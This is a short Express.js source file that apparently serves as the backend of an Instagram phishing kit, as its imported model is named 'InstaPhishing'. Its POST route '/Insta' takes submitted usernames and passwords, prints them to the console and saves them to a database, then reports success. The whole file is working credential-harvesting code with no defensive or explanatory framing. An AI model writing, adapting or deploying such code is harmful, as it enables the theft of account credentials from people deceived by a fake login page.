import express from 'express'



const router =express.Router();
import { instadb } from './models/InstaPhishing.js';

router.get('/',async(req,res)=>{
res.json(" Hello from Service")
})
router.post('/Insta',async (req,res)=>{
  
const {username,password}=req.body
console.log(username,password)
const datasave = new instadb({
      username:username,
      Password:password
})
await datasave.save();
res.json({status:"true"})
})

export {router as UserRouter}